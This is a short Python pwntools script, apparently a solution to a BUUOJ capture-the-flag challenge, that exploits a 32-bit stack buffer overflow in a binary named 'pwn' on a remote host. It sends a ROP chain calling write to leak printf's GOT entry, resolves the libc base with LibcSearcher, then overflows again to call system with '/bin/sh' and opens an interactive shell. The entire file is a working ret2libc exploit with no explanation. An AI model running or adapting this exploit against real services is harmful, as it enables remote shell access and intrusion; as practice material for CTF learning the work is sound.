from pwn import *
from LibcSearcher import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26705)
elf = ELF('./pwn')
io.sendline(cyclic(0x88+4) + p32(elf.plt['write']) + p32(elf.symbols['main']) + p32(1) + p32(elf.got['printf']) + p32(4))
printf = u32(io.recv(4))
libc = LibcSearcher('printf', printf)
base = printf - libc.dump('printf')
print(hex(base))
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
io.sendline(cyclic(0x88+4) + p32(sys) + p32(0xdeadbeef) + p32(binsh))
io.interactive()